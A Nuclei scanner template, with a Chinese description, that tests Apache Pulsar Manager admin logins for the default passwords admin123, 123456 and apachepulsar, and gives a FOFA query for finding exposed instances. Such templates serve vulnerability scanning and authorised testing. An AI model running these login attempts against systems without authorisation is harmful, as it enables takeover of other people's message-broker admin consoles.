id: pulsar-weak-password

info:
  name: Pulsar Admin UI 弱口令
  author: onewin
  severity: high
  description: |
    Apache Pulsar 是灵活的发布-订阅消息系统（Flexible Pub/Sub messaging），采用计算与存储分离的架构。其搭建过程中可能采用绕口令admin123、123456、apachepulsar.
  metadata:
    fofa-query: icon_hash="833224576" || title="Pulsar Admin UI"
  tags: Pulsar

http:
- raw:
  - |
    @timeout: 30s
    GET /pulsar-manager/csrf-token HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
    Accept: application/json, text/plain, */*
    Connection: close

  extractors:
    - type: regex
      part: header
      regex:
        - "XSRF-TOKEN=([a-zA-Z0-9-_]+);"

- raw:
  - |
    @timeout: 30s
    POST /pulsar-manager/login HTTP/1.1
    Host: {{Hostname}}
    Content-Length: 46
    X-XSRF-TOKEN: {{XSRF-TOKEN}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
    Accept: application/json, text/plain, */*
    Content-Type: application/json
    Cookie: XSRF-TOKEN={{XSRF-TOKEN}}
    Connection: close

    {"username":"admin","password":"{{password}}"}

  max-redirects: 3
  disable-cookie: true
  attack: clusterbomb
  payloads:
    password:
      - "admin123"
      - "123456"
      - "apachepulsar"

  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
        - success
      condition: and
